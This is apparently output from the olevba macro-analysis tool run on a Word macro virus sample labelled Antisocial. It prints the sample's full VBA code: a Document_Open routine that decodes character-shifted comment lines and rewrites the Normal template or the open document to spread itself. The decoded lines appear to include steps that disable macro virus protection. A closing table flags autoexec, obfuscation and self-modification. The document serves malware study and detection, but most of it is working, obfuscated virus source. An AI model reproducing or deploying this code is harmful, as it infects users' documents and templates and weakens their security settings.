olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Antisocial-dfc45092c786b3c990d0daf3f8f521d96cc87d42
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Antisocial-dfc45092c786b3c990d0daf3f8f521d96cc87d42 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open(): Application.EnableCancelKey = wdCancelDisabled
If MacroContainer.FullName = ActiveDocument.FullName Then GoTo ADD Else GoTo NDD
NDD: For d = 11 To NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines: C$ = ""
I = (NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(d, 1))
F = (Mid(I, 2, 1)): For X = 3 To Len(I): B$ = Asc(Mid(I, X, 1)) - F: C$ = C$ & Chr(B$): Next X: A = C$
NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.ReplaceLine d, A: Next d: End
ADD: For d = 11 To ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines: C$ = ""
I = (ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(d, 1))
F = (Mid(I, 2, 1)): For X = 3 To Len(I): B$ = Asc(Mid(I, X, 1)) - F: C$ = C$ & Chr(B$): Next X: A = C$
ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.ReplaceLine d, A: Next d: End Sub
'6Vxo|gzk&Y{h&Jui{sktzeIruyk./@&Ut&Kxxux&Xky{sk&Tk~z@&IussgtjHgxy.(Zuury(/4Iutzxury.(Sgixu(/4Jkrkzk
'5Tuyntsx3Xf{jStwrfqUwtruy%B%5?%Tuyntsx3HtsknwrHts{jwxntsx%B%5?%Tuyntsx3[nwzxUwtyjhynts%B%5
'5Nk%If~-St|.%B%6%Ymjs%X~xyjr3Uwn{fyjUwtknqjXywnsl-'H?aFzytwzs3nsk'1%'Fzytwzs'1%'Tujs'.%B%'Ijqywjj%4^%H?a'
'3Iru#g#@#44#Wr#PdfurFrqwdlqhu1YESurmhfw1YEFrpsrqhqwv1Lwhp+4,1FrghPrgxoh1FrxqwRiOlqhv=#F'#@#%%
'3L#@#+PdfurFrqwdlqhu1YESurmhfw1YEFrpsrqhqwv1Lwhp+4,1FrghPrgxoh1Olqhv+g/#4,,
'7M'D'Pu{/Yuk'1'?0'2'8A'Mvy'_'D'8'[v'Slu/P0A'I+'D'Hzj/Tpk/P3'_3'800'2'MA'J+'D'J+'-'Joy/I+0A'Ul{'_A'H'D'J+
'1NbdspDpoubjofs/WCQspkfdu/WCDpnqpofout/Jufn)2*/DpefNpevmf/SfqmbdfMjof!e-!#(#!'!G!'!B;!Ofyu!e
'7Vwlu')JAcIl{yhЂ5pup)'Mvy'V|{w|{'Hz'*8A'Wypu{'*83'ThjyvJvu{hpuly5]IWyvqlj{5]IJvtwvulu{z5P{lt/805JvklTvk|sl5Spulz/83'ThjyvJvu{hpuly5]IWyvqlj{5]IJvtwvulu{z5P{lt/805JvklTvk|sl5Jv|u{VmSpulz0A'Jsvzl'*8
'7Uvyths[ltwsh{l5]IWyvqlj{5]IJvtwvulu{z5P{lt/805JvklTvk|sl5Klsl{lSpulz'83'Uvyths[ltwsh{l5]IWyvqlj{5]IJvtwvulu{z5P{lt/805JvklTvk|sl5Jv|u{VmSpulz
'6Gizo|kJui{sktz4\HVxupkiz4\HIusvutktzy4Ozks.7/4IujkSuj{rk4JkrkzkRotky&72&Gizo|kJui{sktz4\HVxupkiz4\HIusvutktzy4Ozks.7/4IujkSuj{rk4Iu{tzUlRotky
'1OpsnbmUfnqmbuf/WCQspkfdu/WCDpnqpofout/Jufn)2*/DpefNpevmf/BeeGspnGjmf!)#D;]Cfusbz/joj#*
'4EgxmziHsgyqirx2ZFTvsnigx2ZFGsqtsrirxw2Mxiq,5-2GshiQshypi2EhhJvsqJmpi$,&G>`Fixve}2mrm&-
'7Hj{p}lKvj|tlu{5Zh}lHz'MpslUhtlADHj{p}lKvj|tlu{5M|ssUhtlA'Luk'Z|i
'7.Il{yhЂ…IЂ…SЂz…Rv}pjR…Olssv…]_lyz…Huk…H]lyz
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

